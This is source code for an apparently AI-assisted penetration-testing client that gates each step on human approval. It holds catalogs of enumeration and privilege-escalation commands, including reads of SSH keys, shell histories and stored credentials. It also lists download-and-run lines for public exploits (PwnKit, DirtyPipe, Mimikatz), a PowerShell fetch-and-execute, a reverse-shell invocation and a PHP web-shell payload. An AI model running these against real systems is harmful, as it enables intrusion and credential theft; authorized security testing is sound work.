#!/usr/bin/env python3
"""
xs-ai — Interactive AI-assisted pentest client.

Connects to a remote Ollama host, loads your cheat sheets for context,
and walks through enumeration / initial access / privilege escalation
with human approval at every step.

Usage:
    python3 client.py --host 192.168.198.1
    python3 client.py --host 192.168.198.1 --cheatsheet notes.md
    python3 client.py --host 192.168.198.1 --scope scope.json
"""

from __future__ import annotations

import argparse
import datetime
import getpass
import hashlib
import ipaddress
import json
import os
import re
try:
    import readline  # noqa: F401 — enables input() line editing on Linux
except ImportError:
    pass
try:
    import termios  # POSIX only — used to recover the TTY after subprocesses
except ImportError:
    termios = None  # type: ignore
try:
    import research  # Service Research Engine (optional — graceful if absent)
except ImportError:
    research = None  # type: ignore
import shlex
import socket
import subprocess
import sys
import tempfile
import textwrap
import time
import urllib.error
import urllib.parse
import urllib.request
from dataclasses import dataclass, field
from pathlib import Path
from typing import Any

# ---------------------------------------------------------------------------
# Constants
# ---------------------------------------------------------------------------

DEFAULT_PORT = 11434
AI_TIMEOUT = 180
CMD_TIMEOUT = 120
MAX_OUTPUT = 8000
MAX_AI_CONTEXT = 28000

# -- Context budget (addresses small-model context pressure) ------------------
# When feeding notes/evidence to the model, retrieve only the most relevant
# chunks instead of dumping everything and head/tail-truncating.
RETRIEVE_CHUNK_CHARS = 800      # size of each retrievable chunk
RETRIEVE_CHEAT_K = 6            # cheat-sheet chunks kept per prompt
RETRIEVE_EVIDENCE_K = 6         # evidence chunks kept per prompt
DISTILL_MAX_LINES = 70         # lines kept when distilling a large tool output
DISTILL_TRIGGER_LINES = 80     # distill only when output exceeds this
PARALLEL_WORKERS = 3           # max concurrent checks in parallel auto-enum

PHASES = ["recon", "enum", "access", "privesc", "report"]

# Logical AI roles — capabilities, not necessarily separate models. One model
# can fill many; users with several models can map different models per role.
# The research roles (lead_researcher ... report_analyst) back the Research
# Engine milestone; they resolve through the same RoleMap as the phase roles.
AI_ROLES = [
    "planner", "analyzer", "recon", "enum", "access", "privesc", "reporter",
    # research roles
    "lead_researcher", "recon_analyst", "service_researcher", "web_researcher",
    "vuln_analyst", "attack_chain_analyst", "validation_analyst", "report_analyst",
]

DEFAULT_ROLE_CHAIN: dict[str, str] = {
    "recon": "planner",
    "enum": "planner",
    "access": "analyzer",
    "privesc": "analyzer",
    "report": "reporter",
    # research roles fall back to the nearest existing capability so a
    # single-model setup keeps working with no extra configuration
    "lead_researcher": "planner",
    "recon_analyst": "planner",
    "service_researcher": "analyzer",
    "web_researcher": "analyzer",
    "vuln_analyst": "analyzer",
    "attack_chain_analyst": "analyzer",
    "validation_analyst": "analyzer",
    "report_analyst": "reporter",
}

BANNER = r"""
 ██╗  ██╗███████╗       █████╗ ██╗
 ╚██╗██╔╝██╔════╝      ██╔══██╗██║
  ╚███╔╝ ███████╗█████╗███████║██║
  ██╔██╗ ╚════██║╚════╝██╔══██║██║
 ██╔╝ ██╗███████║      ██║  ██║██║
 ╚═╝  ╚═╝╚══════╝      ╚═╝  ╚═╝╚═╝
   PENTEST AI ORCHESTRATOR  v1.1
   by sudoxs
"""

# ---------------------------------------------------------------------------
# Built-in check catalogs for auto-enum
# ---------------------------------------------------------------------------

RECON_CHECKS = [
    ("Quick TCP scan (top 100)", "nmap -Pn -sV --version-light --top-ports 100 -T3 {target}"),
    ("Full TCP scan (all ports)", "nmap -Pn -p- -T4 --min-rate 1000 {target}"),
    ("UDP top 20", "nmap -Pn -sU --top-ports 20 -T3 {target}"),
    ("OS detection", "nmap -Pn -O {target}"),
    ("Script scan on open ports", "nmap -Pn -sC -sV --top-ports 100 -T3 {target}"),
]

# -- Service-specific enum checks (selected based on detected ports) ----------

ENUM_FTP_CHECKS = [
    ("FTP anonymous login", "nmap -Pn -p21 --script ftp-anon {target}"),
    ("FTP banner & methods", "nmap -Pn -p21 -sV --script ftp-syst {target}"),
    ("FTP bounce check", "nmap -Pn -p21 --script ftp-bounce {target}"),
]

ENUM_SSH_CHECKS = [
    ("SSH banner & algorithms", "nmap -Pn -p22 -sV --script ssh2-enum-algos {target}"),
    ("SSH auth methods", "nmap -Pn -p22 --script ssh-auth-methods {target}"),
]

ENUM_SMTP_CHECKS = [
    ("SMTP commands", "nmap -Pn -p25 --script smtp-commands {target}"),
    ("SMTP open relay", "nmap -Pn -p25 --script smtp-open-relay {target}"),
    ("SMTP user enum (VRFY)", "smtp-user-enum -M VRFY -U /usr/share/wordlists/metasploit/unix_users.txt -t {target} 2>/dev/null | head -30 || echo 'smtp-user-enum not installed'"),
]

ENUM_DNS_CHECKS = [
    ("DNS version", "nmap -Pn -p53 --script dns-nsid {target}"),
    ("DNS brute", "nmap -Pn -p53 --script dns-brute {target}"),
    ("Zone transfer attempt", "dig axfr @{target} 2>/dev/null | head -50 || echo 'dig not available'"),
]

ENUM_HTTP_CHECKS = [
    ("HTTP headers", "curl -sI http://{target}/ --connect-timeout 5"),
    ("HTTPS headers", "curl -skI https://{target}/ --connect-timeout 5"),
    ("HTTP robots.txt", "curl -s http://{target}/robots.txt --connect-timeout 5"),
    ("HTTP sitemap.xml", "curl -s http://{target}/sitemap.xml --connect-timeout 5 | head -30"),
    ("Git exposure", "curl -s http://{target}/.git/HEAD --connect-timeout 5"),
    ("WhatWeb fingerprint", "whatweb -v http://{target} 2>/dev/null || echo 'whatweb not installed'"),
    ("Gobuster dirs", "gobuster dir -u http://{target} -w /usr/share/wordlists/dirb/common.txt -t 20 -q 2>/dev/null || echo 'gobuster not installed'"),
    ("Nikto scan", "nikto -h http://{target} -maxtime 120 2>/dev/null || echo 'nikto not installed'"),
    ("WordPress detect", "curl -s http://{target}/ --connect-timeout 5 | grep -i 'wp-content\\|wordpress'"),
    ("WordPress scan", "wpscan --url http://{target} --enumerate u,vp,vt --no-update 2>/dev/null || echo 'wpscan not installed'"),
]

ENUM_SMB_CHECKS = [
    ("SMB shares (null session)", "smbclient -N -L //{target}/ 2>/dev/null || echo 'smbclient not available or SMB not open'"),
    ("SMB enum4linux", "enum4linux -a {target} 2>/dev/null | head -100 || echo 'enum4linux not installed'"),
    ("RPCClient null session", "rpcclient -U '' -N {target} -c 'enumdomusers;enumdomgroups;querydispinfo' 2>/dev/null || echo 'rpcclient failed'"),
    ("SMB signing check", "nmap -Pn -p445 --script smb-security-mode {target}"),
    ("SMB known vulns", "nmap -Pn -p445 --script smb-vuln-ms17-010 {target}"),
    ("CrackMapExec SMB", "crackmapexec smb {target} 2>/dev/null || echo 'crackmapexec not installed'"),
]

ENUM_NFS_CHECKS = [
    ("NFS exports", "showmount -e {target} 2>/dev/null || echo 'showmount not available'"),
    ("NFS mount attempt", "nmap -Pn -p2049 --script nfs-ls,nfs-showmount {target}"),
]

ENUM_MSSQL_CHECKS = [
    ("MSSQL info", "nmap -Pn -p1433 --script ms-sql-info {target}"),
    ("MSSQL empty password", "nmap -Pn -p1433 --script ms-sql-empty-password {target}"),
    ("MSSQL brute (top creds)", "nmap -Pn -p1433 --script ms-sql-brute --script-args userdb=/usr/share/wordlists/metasploit/default_users_for_services_unhash.txt,passdb=/usr/share/wordlists/metasploit/default_pass_for_services_unhash.txt {target}"),
]

ENUM_MYSQL_CHECKS = [
    ("MySQL info", "nmap -Pn -p3306 --script mysql-info,mysql-enum {target}"),
    ("MySQL empty root", "nmap -Pn -p3306 --script mysql-empty-password {target}"),
    ("MySQL variables", "nmap -Pn -p3306 --script mysql-variables {target} 2>/dev/null | head -30"),
]

ENUM_RDP_CHECKS = [
    ("RDP version", "nmap -Pn -p3389 -sV {target}"),
    ("RDP encryption", "nmap -Pn -p3389 --script rdp-enum-encryption {target}"),
    ("RDP NLA check", "nmap -Pn -p3389 --script rdp-ntlm-info {target}"),
]

ENUM_WINRM_CHECKS = [
    ("WinRM check", "nmap -Pn -p5985,5986 -sV {target}"),
    ("WinRM brute (if creds)", "crackmapexec winrm {target} 2>/dev/null || echo 'crackmapexec not installed'"),
]

ENUM_SNMP_CHECKS = [
    ("SNMP community strings", "onesixtyone -c /usr/share/seclists/Discovery/SNMP/common-snmp-community-strings.txt {target} 2>/dev/null || echo 'onesixtyone not installed'"),
    ("SNMP system info", "snmpwalk -v2c -c public {target} 1.3.6.1.2.1.1 2>/dev/null | head -20 || echo 'snmpwalk not available'"),
    ("SNMP processes", "snmpwalk -v2c -c public {target} 1.3.6.1.2.1.25.4.2 2>/dev/null | head -30 || echo 'snmpwalk not available'"),
    ("SNMP installed software", "snmpwalk -v2c -c public {target} 1.3.6.1.2.1.25.6.3 2>/dev/null | head -30 || echo 'snmpwalk not available'"),
    ("SNMP TCP connections", "snmpwalk -v2c -c public {target} 1.3.6.1.2.1.6.13 2>/dev/null | head -30 || echo 'snmpwalk not available'"),
]

ENUM_REDIS_CHECKS = [
    ("Redis info", "redis-cli -h {target} INFO 2>/dev/null | head -30 || echo 'redis-cli not available'"),
    ("Redis config", "redis-cli -h {target} CONFIG GET * 2>/dev/null | head -40 || echo 'redis-cli not available'"),
]

ENUM_LDAP_CHECKS = [
    ("LDAP anonymous bind", "ldapsearch -x -H ldap://{target} -b '' -s base namingContexts 2>/dev/null || echo 'ldapsearch not available'"),
    ("LDAP base search", "ldapsearch -x -H ldap://{target} -b '' -s base '(objectClass=*)' '*' + 2>/dev/null | head -50 || echo 'ldapsearch not available'"),
]

SERVICE_PORT_MAP = {
    "21": ENUM_FTP_CHECKS,
    "22": ENUM_SSH_CHECKS,
    "25": ENUM_SMTP_CHECKS, "587": ENUM_SMTP_CHECKS,
    "53": ENUM_DNS_CHECKS,
    "80": ENUM_HTTP_CHECKS, "443": ENUM_HTTP_CHECKS, "8080": ENUM_HTTP_CHECKS, "8443": ENUM_HTTP_CHECKS,
    "111": ENUM_NFS_CHECKS, "2049": ENUM_NFS_CHECKS,
    "139": ENUM_SMB_CHECKS, "445": ENUM_SMB_CHECKS,
    "1433": ENUM_MSSQL_CHECKS,
    "3306": ENUM_MYSQL_CHECKS,
    "3389": ENUM_RDP_CHECKS,
    "5985": ENUM_WINRM_CHECKS, "5986": ENUM_WINRM_CHECKS,
    "161": ENUM_SNMP_CHECKS,
    "6379": ENUM_REDIS_CHECKS,
    "389": ENUM_LDAP_CHECKS, "636": ENUM_LDAP_CHECKS,
}

# -- General enum (no port detection, always available) -----------------------

ENUM_LINUX_CHECKS = [
    ("SSH banner grab", "nmap -Pn -p22 -sV {target}"),
    ("HTTP headers", "curl -sI http://{target}/ --connect-timeout 5"),
    ("HTTPS headers", "curl -skI https://{target}/ --connect-timeout 5"),
    ("HTTP robots.txt", "curl -s http://{target}/robots.txt --connect-timeout 5"),
    ("Git exposure check", "curl -s http://{target}/.git/HEAD --connect-timeout 5"),
    ("Gobuster dirs", "gobuster dir -u http://{target} -w /usr/share/wordlists/dirb/common.txt -t 20 -q 2>/dev/null || echo 'gobuster not installed'"),
    ("SMB shares", "smbclient -N -L //{target}/ 2>/dev/null || echo 'smbclient not available or SMB not open'"),
    ("RPCClient null session", "rpcclient -U '' -N {target} -c 'enumdomusers' 2>/dev/null || echo 'rpcclient failed'"),
    ("NFS exports", "showmount -e {target} 2>/dev/null || echo 'showmount not available or NFS not open'"),
    ("SNMP community check", "snmpwalk -v2c -c public {target} 2>/dev/null | head -30 || echo 'snmpwalk not available or SNMP not open'"),
]

ENUM_WINDOWS_CHECKS = [
    ("SMB shares", "smbclient -N -L //{target}/ 2>/dev/null || echo 'smbclient not available'"),
    ("Enum4linux", "enum4linux -a {target} 2>/dev/null | head -100 || echo 'enum4linux not installed'"),
    ("RPCClient null session", "rpcclient -U '' -N {target} -c 'enumdomusers;enumdomgroups' 2>/dev/null || echo 'rpcclient failed'"),
    ("LDAP anonymous bind", "ldapsearch -x -H ldap://{target} -b '' -s base namingContexts 2>/dev/null || echo 'ldapsearch not available or LDAP not open'"),
    ("WinRM check", "nmap -Pn -p5985,5986 -sV {target}"),
    ("RDP check", "nmap -Pn -p3389 -sV {target}"),
    ("MSSQL check", "nmap -Pn -p1433 -sV --script ms-sql-info {target}"),
    ("SNMP check", "snmpwalk -v2c -c public {target} 2>/dev/null | head -30 || echo 'snmpwalk not available'"),
]

# -- Privilege escalation checks ----------------------------------------------

PRIVESC_LINUX_CHECKS = [
    ("Current user & groups", "id; whoami; hostname; groups"),
    ("Kernel & OS info", "uname -a; cat /etc/os-release 2>/dev/null"),
    ("Sudo permissions", "sudo -n -l 2>&1"),
    ("Sudo version", "sudo --version 2>/dev/null | head -1"),
    ("SUID binaries", "find / -perm -4000 -type f 2>/dev/null | head -40"),
    ("SGID binaries", "find / -perm -2000 -type f 2>/dev/null | head -20"),
    ("Capabilities", "getcap -r / 2>/dev/null | head -30"),
    ("Interesting groups", "id | grep -Eo '(disk|docker|lxd|lxc|adm|video|shadow|root)'"),
    ("Docker socket", "ls -la /var/run/docker.sock 2>/dev/null; docker ps 2>/dev/null"),
    ("LXD membership", "lxc list 2>/dev/null; id | grep lxd"),
    ("Writable /etc files", "find /etc -writable -type f 2>/dev/null"),
    ("Cron jobs", "cat /etc/crontab 2>/dev/null; ls -la /etc/cron.d/ 2>/dev/null; crontab -l 2>/dev/null"),
    ("Writable cron dirs", "find /etc/cron* /var/spool/cron -writable 2>/dev/null"),
    ("Running services", "ps aux --sort=-rss | head -30"),
    ("Internal listeners", "ss -tlnp 2>/dev/null | grep 127 || netstat -tlnp 2>/dev/null | grep 127"),
    ("Network connections", "ss -tlnp 2>/dev/null || netstat -tlnp 2>/dev/null"),
    ("Interesting files", "find / -name '*.bak' -o -name '*.old' -o -name '*.conf' -o -name '*password*' -o -name '*secret*' 2>/dev/null | grep -v proc | head -30"),
    ("SSH keys", "find / -name 'id_rsa' -o -name 'id_ed25519' -o -name 'id_ecdsa' -o -name 'authorized_keys' 2>/dev/null"),
    ("Bash history", "cat /home/*/.bash_history /root/.bash_history 2>/dev/null | head -50"),
    ("Home directories", "ls -la /home/ 2>/dev/null; ls -la /root/ 2>/dev/null"),
    ("Writable PATH dirs", "for d in $(echo $PATH | tr ':' ' '); do [ -w \"$d\" ] && echo \"WRITABLE: $d\"; done"),
    ("Writable Python libs", "find / -writable -name '*.py' 2>/dev/null | grep -v __pycache__ | head -20"),
    ("Container check", "cat /proc/1/cgroup 2>/dev/null | head -5; ls /.dockerenv 2>/dev/null"),
    ("Polkit version", "pkexec --version 2>/dev/null"),
    ("PKEXEC SUID", "ls -la $(which pkexec 2>/dev/null) 2>/dev/null"),
    ("NFS no_root_squash", "cat /etc/exports 2>/dev/null"),
    ("Mounted shares", "mount | grep -E 'nfs|cifs|smb'"),
    ("Mail & config files", "find /var/mail /var/spool/mail /opt -readable -type f 2>/dev/null | head -20"),
]

PRIVESC_WINDOWS_CHECKS = [
    ("Current user", "whoami /all"),
    ("System info", "systeminfo | findstr /B /C:\"OS Name\" /C:\"OS Version\" /C:\"System Type\" /C:\"Domain\" /C:\"Hotfix\""),
    ("Token privileges", "whoami /priv"),
    ("SeImpersonate check", "whoami /priv | findstr /i SeImpersonate"),
    ("SeBackup/SeRestore", "whoami /priv | findstr /i \"SeBackup SeRestore SeDebug SeTakeOwnership\""),
    ("Local admins", "net localgroup Administrators"),
    ("All local groups", "net localgroup"),
    ("Domain info", "net user /domain 2>nul | head -20"),
    ("Services with weak perms", "wmic service get name,pathname,startmode,startname 2>nul | findstr /i /v \"C:\\Windows\" | head -30"),
    ("Unquoted service paths", "wmic service get name,displayname,pathname,startmode 2>nul | findstr /i /v \"C:\\Windows\\\" | findstr /i /v \"\\\"\""),
    ("Scheduled tasks", "schtasks /query /fo TABLE /nh 2>nul | head -30"),
    ("AlwaysInstallElevated", "reg query HKLM\\SOFTWARE\\Policies\\Microsoft\\Windows\\Installer /v AlwaysInstallElevated 2>nul & reg query HKCU\\SOFTWARE\\Policies\\Microsoft\\Windows\\Installer /v AlwaysInstallElevated 2>nul"),
    ("UAC level", "reg query HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Policies\\System /v ConsentPromptBehaviorAdmin 2>nul"),
    ("Stored credentials", "cmdkey /list"),
    ("Registry autologon", "reg query \"HKLM\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon\" /v DefaultUserName 2>nul & reg query \"HKLM\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon\" /v DefaultPassword 2>nul"),
    ("SAM file ACL", "icacls C:\\Windows\\System32\\config\\SAM 2>nul"),
    ("PowerShell history", "type %APPDATA%\\Microsoft\\Windows\\PowerShell\\PSReadLine\\ConsoleHost_history.txt 2>nul | head -50"),
    ("Installed software", "wmic product get name,version 2>nul | head -30"),
    ("Network connections", "netstat -ano | findstr LISTENING"),
    ("Mounted drives", "wmic logicaldisk get caption,description,volumename 2>nul"),
    ("Firewall state", "netsh advfirewall show allprofiles state 2>nul"),
]

# ---------------------------------------------------------------------------
# Tool recommendation engine — suggest-only tools (need download)
# ---------------------------------------------------------------------------

TOOL_SUGGESTIONS = [
    {
        "name": "linpeas",
        "description": "Linux privilege escalation audit script — comprehensive automated enumeration",
        "phase": "privesc",
        "os": "linux",
        "condition": "uname -a",
        "download": "curl -L https://github.com/peass-ng/PEASS-ng/releases/latest/download/linpeas.sh -o /tmp/linpeas.sh",
        "usage": "chmod +x /tmp/linpeas.sh && /tmp/linpeas.sh | tee /tmp/linpeas_output.txt",
    },
    {
        "name": "winPEAS",
        "description": "Windows privilege escalation audit script",
        "phase": "privesc",
        "os": "windows",
        "condition": "systeminfo",
        "download": "certutil -urlcache -split -f https://github.com/peass-ng/PEASS-ng/releases/latest/download/winPEASx64.exe C:\\Temp\\winpeas.exe",
        "usage": "C:\\Temp\\winpeas.exe",
    },
    {
        "name": "pspy",
        "description": "Monitor processes without root — reveals cron jobs & scheduled tasks",
        "phase": "privesc",
        "os": "linux",
        "condition": "uname -m",
        "download": "curl -L https://github.com/DominicBreuker/pspy/releases/latest/download/pspy64 -o /tmp/pspy64",
        "usage": "chmod +x /tmp/pspy64 && timeout 120 /tmp/pspy64 -f",
    },
    {
        "name": "PrintSpoofer",
        "description": "Exploit SeImpersonatePrivilege on Windows 10/Server 2016+",
        "phase": "privesc",
        "os": "windows",
        "condition": "whoami /priv | findstr SeImpersonate",
        "prereq": "SeImpersonatePrivilege must be Enabled",
        "download": "certutil -urlcache -split -f https://github.com/itm4n/PrintSpoofer/releases/latest/download/PrintSpoofer64.exe C:\\Temp\\PrintSpoofer.exe",
        "usage": "C:\\Temp\\PrintSpoofer.exe -i -c cmd",
    },
    {
        "name": "GodPotato",
        "description": "Universal Potato for SeImpersonate — works on all Windows versions",
        "phase": "privesc",
        "os": "windows",
        "condition": "whoami /priv | findstr SeImpersonate",
        "prereq": "SeImpersonatePrivilege must be Enabled",
        "download": "certutil -urlcache -split -f https://github.com/BeichenDream/GodPotato/releases/latest/download/GodPotato-NET4.exe C:\\Temp\\GodPotato.exe",
        "usage": "C:\\Temp\\GodPotato.exe -cmd \"cmd /c whoami\"",
    },
    {
        "name": "SigmaPotato",
        "description": "Another SeImpersonate exploit — alternative to PrintSpoofer/GodPotato",
        "phase": "privesc",
        "os": "windows",
        "condition": "whoami /priv | findstr SeImpersonate",
        "prereq": "SeImpersonatePrivilege must be Enabled",
        "download": "certutil -urlcache -split -f https://github.com/tylerdotrar/SigmaPotato/releases/latest/download/SigmaPotato.exe C:\\Temp\\SigmaPotato.exe",
        "usage": "C:\\Temp\\SigmaPotato.exe --revshell --ip <LHOST> --port <LPORT>",
    },
    {
        "name": "JuicyPotato",
        "description": "SeImpersonate exploit for older Windows (Server 2008/2012/2016)",
        "phase": "privesc",
        "os": "windows",
        "condition": "whoami /priv | findstr SeImpersonate",
        "prereq": "SeImpersonatePrivilege Enabled + Windows < Server 2019",
        "download": "certutil -urlcache -split -f https://github.com/ohpe/juicy-potato/releases/latest/download/JuicyPotato.exe C:\\Temp\\JuicyPotato.exe",
        "usage": "C:\\Temp\\JuicyPotato.exe -l 1337 -p C:\\Windows\\System32\\cmd.exe -a \"/c whoami\" -t *",
    },
    {
        "name": "PwnKit (CVE-2021-4034)",
        "description": "Polkit pkexec local privilege escalation",
        "phase": "privesc",
        "os": "linux",
        "condition": "pkexec --version 2>/dev/null; ls -la $(which pkexec 2>/dev/null) 2>/dev/null",
        "prereq": "pkexec must be SUID and polkit version < 0.120",
        "download": "curl -L https://raw.githubusercontent.com/ly4k/PwnKit/main/PwnKit -o /tmp/PwnKit",
        "usage": "chmod +x /tmp/PwnKit && /tmp/PwnKit",
    },
    {
        "name": "DirtyPipe (CVE-2022-0847)",
        "description": "Linux kernel exploit for privilege escalation",
        "phase": "privesc",
        "os": "linux",
        "condition": "uname -r",
        "prereq": "Kernel 5.8 <= version < 5.16.11 / 5.15.25 / 5.10.102",
        "download": "curl -L https://raw.githubusercontent.com/Al1ex/CVE-2022-0847/main/exp.c -o /tmp/dirty_pipe.c",
        "usage": "gcc /tmp/dirty_pipe.c -o /tmp/dirty_pipe && /tmp/dirty_pipe /etc/passwd 1 '${openssl_hash}' # replace with password hash",
    },
    {
        "name": "Baron Samedit (CVE-2021-3156)",
        "description": "Sudo heap overflow for privilege escalation",
        "phase": "privesc",
        "os": "linux",
        "condition": "sudo --version 2>/dev/null | head -1",
        "prereq": "Sudo 1.8.2 through 1.8.31p2 / 1.9.0 through 1.9.5p1",
        "download": "git clone https://github.com/blasty/CVE-2021-3156.git /tmp/baron_samedit",
        "usage": "cd /tmp/baron_samedit && make && ./sudo-hax-me-a-sandwich <target_number>",
    },
    {
        "name": "traitor",
        "description": "Automated Linux privilege escalation — tries known exploits",
        "phase": "privesc",
        "os": "linux",
        "condition": "uname -a",
        "download": "curl -L https://github.com/liamg/traitor/releases/latest/download/traitor-amd64 -o /tmp/traitor",
        "usage": "chmod +x /tmp/traitor && /tmp/traitor -a",
    },
    {
        "name": "Mimikatz",
        "description": "Windows credential harvesting — extracts passwords, hashes, Kerberos tickets",
        "phase": "privesc",
        "os": "windows",
        "condition": "whoami /priv | findstr SeDebug",
        "prereq": "Requires admin/SYSTEM or SeDebugPrivilege",
        "download": "certutil -urlcache -split -f https://github.com/gentilkiwi/mimikatz/releases/latest/download/mimikatz_trunk.zip C:\\Temp\\mimikatz.zip",
        "usage": "mimikatz.exe \"privilege::debug\" \"sekurlsa::logonpasswords\" \"exit\"",
    },
    {
        "name": "PowerUp",
        "description": "Windows privilege escalation audit via PowerShell",
        "phase": "privesc",
        "os": "windows",
        "condition": "powershell -c \"$PSVersionTable.PSVersion\" 2>nul",
        "download": "powershell -c \"IEX(New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/Privesc/PowerUp.ps1')\"",
        "usage": "powershell -c \"Import-Module .\\PowerUp.ps1; Invoke-AllChecks\"",
    },
    {
        "name": "chisel",
        "description": "TCP/UDP tunneling over HTTP — port forwarding & pivoting",
        "phase": "access",
        "os": "any",
        "condition": "ss -tlnp 2>/dev/null | grep 127 || netstat -tlnp 2>/dev/null | grep 127",
        "prereq": "Internal services listening on localhost only",
        "download": "curl -L https://github.com/jpillora/chisel/releases/latest/download/chisel_linux_amd64.gz -o /tmp/chisel.gz && gunzip /tmp/chisel.gz",
        "usage": "# On attacker: chisel server -p 8000 --reverse\n# On target: ./chisel client <LHOST>:8000 R:<LOCAL_PORT>:127.0.0.1:<REMOTE_PORT>",
    },
    {
        "name": "ligolo-ng",
        "description": "Advanced tunneling/pivoting tool — creates tun interfaces",
        "phase": "access",
        "os": "any",
        "condition": "ip route 2>/dev/null || route print 2>nul",
        "prereq": "Need to reach another subnet through compromised host",
        "download": "# Download agent for target from https://github.com/nicocha30/ligolo-ng/releases\n# Download proxy for attacker machine",
        "usage": "# Attacker: ./proxy -selfcert -laddr 0.0.0.0:11601\n# Target: ./agent -connect <LHOST>:11601 -ignore-cert",
    },
    {
        "name": "php_filter_chain_generator",
        "description": "Generate PHP filter chains for LFI-to-RCE without file upload",
        "phase": "access",
        "os": "any",
        "condition": "curl -s http://{target}/ --connect-timeout 5 | grep -i php",
        "prereq": "PHP LFI vulnerability must exist",
        "download": "git clone https://github.com/synacktiv/php_filter_chain_generator.git /tmp/php_filter_chain",
        "usage": "python3 /tmp/php_filter_chain/php_filter_chain_generator.py --chain '<?php system($_GET[\"cmd\"]);?>'",
    },
    {
        "name": "git-dumper",
        "description": "Dump exposed .git directories from web servers",
        "phase": "enum",
        "os": "any",
        "condition": "curl -s http://{target}/.git/HEAD --connect-timeout 5",
        "prereq": ".git directory must be accessible",
        "download": "pip3 install git-dumper",
        "usage": "git-dumper http://{target}/.git /tmp/git_dump",
    },
]


def get_relevant_tools(session: Session) -> list[dict]:
    relevant = []
    for tool in TOOL_SUGGESTIONS:
        if tool["phase"] not in (session.phase, "any") and session.phase != tool["phase"]:
            continue
        if tool["os"] not in (session.target_os, "any", "") and session.target_os:
            continue
        relevant.append(tool)
    return relevant


# ---------------------------------------------------------------------------
# Tool installation manager — check & offer to install missing tools
# ---------------------------------------------------------------------------

TOOL_INSTALL_MAP = {
    "nmap":           "apt install -y nmap",
    "gobuster":       "apt install -y gobuster",
    "feroxbuster":    "apt install -y feroxbuster",
    "nikto":          "apt install -y nikto",
    "enum4linux":     "apt install -y enum4linux",
    "smbclient":      "apt install -y smbclient",
    "rpcclient":      "apt install -y rpcclient || apt install -y samba-common-bin",
    "ldapsearch":     "apt install -y ldap-utils",
    "snmpwalk":       "apt install -y snmp",
    "onesixtyone":    "apt install -y onesixtyone",
    "dig":            "apt install -y dnsutils",
    "whatweb":        "apt install -y whatweb",
    "wpscan":         "apt install -y wpscan || gem install wpscan",
    "hydra":          "apt install -y hydra",
    "hashcat":        "apt install -y hashcat",
    "john":           "apt install -y john",
    "searchsploit":   "apt install -y exploitdb",
    "crackmapexec":   "apt install -y crackmapexec || pip3 install crackmapexec",
    "redis-cli":      "apt install -y redis-tools",
    "showmount":      "apt install -y nfs-common",
    "curl":           "apt install -y curl",
    "ftp":            "apt install -y ftp",
    "smtp-user-enum": "apt install -y smtp-user-enum",
    "git-dumper":     "pip3 install git-dumper",
    "impacket-mssqlclient": "apt install -y impacket-scripts || pip3 install impacket",
    "evil-winrm":     "gem install evil-winrm",
}


def check_tool_installed(tool_name: str) -> bool:
    try:
        result = subprocess.run(
            ["which", tool_name], capture_output=True, text=True, timeout=5,
        )
        return result.returncode == 0
    except Exception:
        return False


def check_and_install_tools(tool_names: list[str]) -> dict[str, bool]:
    status: dict[str, bool] = {}
    missing: list[str] = []
    for name in tool_names:
        installed = check_tool_installed(name)
        status[name] = installed
        if not installed:
            missing.append(name)

    if not missing:
        return status

    cprint("yellow", f"\n  Missing tools: {', '.join(missing)}")
    for name in missing:
        install_cmd = TOOL_INSTALL_MAP.get(name)
        if install_cmd:
            cprint("dim", f"    {name}: {install_cmd}")

    reset_terminal(flush=True)
    try:
        ans = input(f"  {COLOR['bold']}Install missing tools? [y/n/select]:{COLOR['reset']} ").strip().lower()
    except (EOFError, KeyboardInterrupt):
        return status

    if ans in ("y", "yes"):
        for name in missing:
            install_cmd = TOOL_INSTALL_MAP.get(name)
            if not install_cmd:
                cprint("dim", f"    {name}: no auto-install available")
                continue
            cprint("dim", f"    Installing {name}...")
            code, output = run_command(f"sudo {install_cmd}", timeout=120)
            if code == 0:
                cprint("green", f"    {name} installed OK")
                status[name] = True
            else:
                cprint("red", f"    {name} install failed: {output[:200]}")
    elif ans == "select":
        for name in missing:
            install_cmd = TOOL_INSTALL_MAP.get(name)
            if not install_cmd:
                continue
            reset_terminal(flush=True)
            try:
                a = input(f"    Install {name}? [y/n]: ").strip().lower()
            except (EOFError, KeyboardInterrupt):
                break
            if a in ("y", "yes"):
                cprint("dim", f"    Installing {name}...")
                code, output = run_command(f"sudo {install_cmd}", timeout=120)
                if code == 0:
                    cprint("green", f"    {name} installed OK")
                    status[name] = True
                else:
                    cprint("red", f"    {name} install failed: {output[:200]}")

    return status


# ---------------------------------------------------------------------------
# Project memory — AI-readable engagement state saved across sessions
# ---------------------------------------------------------------------------

def generate_project_memory(session: Session) -> str:
    ts = datetime.datetime.now().strftime("%Y-%m-%d %H:%M")
    lines = [
        f"# xs-ai Project Memory",
        f"# Auto-generated — AI reads this to resume where you left off",
        f"# Last updated: {ts}",
        "",
        f"## Target",
        f"- IP: {session.target}",
        f"- OS: {session.target_os or 'unknown'}",
        f"- Current phase: {session.phase}",
        "",
    ]

    if session.credentials:
        lines.append("## Credentials")
        for k, v in session.credentials.items():
            lines.append(f"- {k}: {v}")
        lines.append("")

    # Open ports from scan results
    open_ports: list[str] = []
    for rec in session.commands:
        if rec.useful and "nmap" in rec.command:
            for line in rec.output.splitlines():
                m = re.match(r"\s*(\d+)/(tcp|udp)\s+open\s+(\S+)", line)
                if m:
                    port_info = f"{m.group(1)}/{m.group(2)} {m.group(3)}"
                    if port_info not in open_ports:
                        open_ports.append(port_info)
    if open_ports:
        lines.append("## Open Ports")
        for p in open_ports:
            lines.append(f"- {p}")
        lines.append("")

    if session.findings:
        lines.append("## Findings")
        for i, f in enumerate(session.findings, 1):
            lines.append(f"{i}. {f}")
        lines.append("")

    # Phases completed
    tested_phases = {rec.phase for rec in session.commands}
    lines.append("## Progress")
    for phase in PHASES[:-1]:
        done = phase in tested_phases
        mark = "x" if done else " "
        count = sum(1 for r in session.commands if r.phase == phase)
        lines.append(f"- [{mark}] {phase} ({count} commands run)")
    lines.append("")

    # What worked / what didn't
    useful = [r for r in session.commands if r.useful]
    not_useful = [r for r in session.commands if not r.useful]
    lines.append("## What Worked")
    if useful:
        for rec in useful:
            prefix = "(remote) " if rec.remote else ""
            lines.append(f"- [{rec.phase}] {prefix}`{rec.command}`")
            if rec.note:
                lines.append(f"  - {rec.note}")
    else:
        lines.append("- Nothing useful yet")
    lines.append("")

